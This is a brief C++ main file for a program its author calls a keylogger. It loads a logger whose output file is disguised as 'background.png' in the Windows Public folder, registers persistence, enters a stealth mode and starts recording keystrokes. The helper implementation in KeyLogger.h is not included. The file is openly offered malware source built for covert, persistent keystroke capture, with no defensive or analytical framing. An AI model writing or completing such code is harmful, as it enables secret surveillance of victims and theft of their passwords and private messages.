//   Author(s) : Narcis GRECU (narcisgrecu07@gmail.com)

#include "KeyLogger.h"

int main()
{
	KeyLogger Logger( R"(C:\Users\Public\background.png)" );

	if (!Logger.RegisterPersistence())
	{
		Logger.WriteMessage("[!] Failed to register persistence!\n");
	}

	if (!Logger.StartStealthMode())
	{
		Logger.WriteMessage("[!] Failed to start stealth mode!\n");
		return 0;
	}
	Logger.StartLogging();

	return 0;
}